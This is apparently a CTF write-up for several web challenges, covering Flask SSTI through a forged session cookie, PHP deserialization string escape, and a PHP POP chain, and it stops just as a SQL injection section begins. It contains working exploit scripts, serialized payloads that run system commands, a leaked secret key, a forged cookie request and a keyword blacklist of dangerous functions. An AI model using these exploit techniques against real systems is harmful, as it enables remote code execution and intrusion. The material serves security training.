class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cancanneed&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cancanneed</span>():</span><br><span class="line">    all_filename = os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;static/img/&#x27;</span>, filename)</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(filename)) <span class="keyword">and</span> (<span class="string">&quot;start&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename):</span><br><span class="line">            <span class="keyword">return</span> send_file(filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_find</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>session中的user会被不正当的渲染，<code>config.py</code>里面读取到<code>y0u_n3ver_k0nw_s3cret_key_1s_newst4r</code>这个KEY，就可以RCE了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line">BLACKLIST = [</span><br><span class="line">    <span class="string">&quot;__&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;subclasses&quot;</span>, <span class="string">&quot;builtins&quot;</span>, <span class="string">&quot;globals&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;request&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;tac&quot;</span>,</span><br><span class="line">    <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;\\x&quot;</span>, <span class="string">&quot;.&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_fenjing_payload</span>(<span class="params">cmd: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    payload, _ = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_signed_cookie</span>(<span class="params">payload: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    cookie_json = json.dumps(&#123;<span class="string">&quot;user&quot;</span>: payload&#125;, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    proc = subprocess.run(</span><br><span class="line">        [<span class="string">&quot;flask-unsign&quot;</span>, <span class="string">&quot;--sign&quot;</span>, <span class="string">&quot;--cookie&quot;</span>, cookie_json, <span class="string">&quot;--secret&quot;</span>, secret],</span><br><span class="line">        capture_output=<span class="literal">True</span>, text=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> proc.returncode != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;flask-unsign failed: <span class="subst">&#123;proc.stderr.strip()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> proc.stdout.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># ssti_payload = gen_fenjing_payload(&quot;ls /&quot;)</span></span><br><span class="line">    ssti_payload = gen_fenjing_payload(<span class="string">&quot;tac /y0U3_f14g_1s_h3re&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Fenjing payload:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ssti_payload)</span><br><span class="line"></span><br><span class="line">    secret = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br><span class="line">    signed_cookie = gen_signed_cookie(ssti_payload, secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nSigned cookie:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(signed_cookie)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/backdoor</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>baf2a37e-76b4-4a20-95a4-1d50fb24ae97.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>http://baf2a37e-76b4-4a20-95a4-1d50fb24ae97.node5.buuoj.cn:81/cancanneed?file=1.jpg</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=.eJxdzcEKgkAQBuBXkYH49VRRp96jk8qitdnC6i676yHEnj1_CYMO8zEzP8NMMkYd5CLTzgczpCzPrfFx7EsovNfqAOvaxsbvrFD_whYYjU1m-EuhTO9dSOxQ53BARFGU8IDzelh2laRKKmnIjWRkT17kQK7kRBR5kCM5k24L1l3cxud2FoiuhL-Dbu7L42I3y_wBmNpHmg.aJbi0A.VyZ7WpCdIRqTZl5WzFJtWw4jAfs</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])))); www-data www-data</span><br></pre></td></tr></table></figure><p>字符增多的字符串逃逸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bad&quot;</span>*<span class="number">24</span>+<span class="string">&#x27;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;key;</span><br></pre></td></tr></table></figure><h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br><span class="line">Fatal error: Uncaught <span class="built_in">Exception</span>: Nope in /<span class="keyword">var</span>/www/html/index.php:<span class="number">55</span> Stack trace: <span class="comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span></span><br></pre></td></tr></table></figure><p>GC绕过即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start.__destruct() --&gt; Crypto.__toString() --&gt; Reverse.__get() --&gt; Pwn.__invoke() --&gt; Web.evil() </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123; <span class="keyword">public</span> <span class="variable">$errMsg</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123; <span class="keyword">public</span> <span class="variable">$obj</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123; <span class="keyword">public</span> <span class="variable">$func</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123; <span class="keyword">public</span> <span class="variable">$func</span>; <span class="keyword">public</span> <span class="variable">$var</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123; <span class="keyword">public</span> <span class="variable">$obj</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$w</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="comment">//$w-&gt;var  = &#x27;ls /&#x27;;</span></span><br><span class="line"><span class="variable">$w</span>-&gt;<span class="keyword">var</span>  = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;obj = <span class="variable">$w</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$r</span>-&gt;func = <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;obj = <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;errMsg = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$payload</span>, <span class="number">0</span>, -<span class="number">1</span>), PHP_EOL;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;select name, price from items where id = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span 